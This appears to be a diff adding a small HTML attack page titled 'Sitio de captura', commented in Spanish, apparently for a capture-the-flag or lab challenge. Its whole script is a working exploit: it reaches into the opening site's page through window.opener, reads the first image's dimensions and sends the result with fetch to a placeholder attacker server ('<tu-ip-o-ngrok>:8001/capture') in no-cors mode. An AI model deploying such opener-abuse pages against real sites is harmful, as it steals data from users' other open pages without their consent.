@@ -1,0 +1,29 @@
+<html>
+<body>
+    <h1>Sitio de captura</h1>
+    <script>
+        // Intentar acceder al DOM del sitio "Imagen Importante" usando window.opener
+        try {
+            const img = window.opener.document.querySelector('img'); // Busca la primera imagen, ajusta el selector si es necesario
+            if (img) {
+                const width = img.naturalWidth;
+                const height = img.naturalHeight;
+                const level = width * height;
+                // Enviar el nivel a un endpoint en tu servidor
+                fetch('http://<tu-ip-o-ngrok>:8001/capture?level=' + level, {
+                    method: 'GET',
+                    mode: 'no-cors' // Para evitar problemas con CORS en el servidor de captura
+                }).then(() => {
+                    console.log('Nivel enviado: ' + level);
+                }).catch(err => {
+                    console.error('Error al enviar el nivel: ', err);
+                });
+            } else {
+                console.log('No se encontró la imagen de Pepe');
+            }
+        } catch (err) {
+            console.error('Error al acceder al DOM: ', err);
+        }
+    </script>
+</body>
+</html>
